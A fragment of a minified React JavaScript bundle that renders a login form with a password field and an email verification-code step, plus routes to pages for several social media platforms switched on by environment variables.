e.handlePassword(t)},value:this.state.password,type:"password"})),this.state.loading?l.a.createElement(g.a,{variant:"primary",type:"submit",disabled:!0},l.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):l.a.createElement(g.a,{variant:"primary",type:"submit"},"Login"),this.state.manualCheck?l.a.createElement("div",null,l.a.createElement(T.a.Group,null,l.a.createElement(T.a.Label,null,"Enter code recieved in your email"),l.a.createElement(T.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11"})),l.a.createElement(g.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),F=_()();var G=function(){return l.a.createElement(s.d,null,l.a.createElement(s.b,{path:"/",component:C,exact:!0}),"true"===F.REACT_APP_TWITTER?l.a.createElement(s.b,{path:"/Twitter",component:L,exact:!0}):"","true"===F.REACT_APP_LINKEDIN?l.a.createElement(s.b,{path:"/LinkedIn",component:N,exact:!0}):"","true"===F.REACT_APP_INSTAGRAM?l.a.createElement(s.b,{path:"/Instagram",component:b,exact:!0}):"","true"===F.REACT_APP_PINTEREST?l.a.createElement(s.b,{path:"/Pinterest",component:D,exact:!0}):"","true"===F.REACT_APP_FACEBOOK?l.a.createElement(s.b,{path:"/Facebook",component:j,exact:!0}):"")},M=a(15),K=a(7),Y=Object(K.a)();r.a.render(l.a.createElement(M.a,{history:Y},l.a.createElement(G,null)),document.getElementById("root"))}},[[41,1,2]]]);
//# sourceMappingURL=main.004369c7.chunk.js.map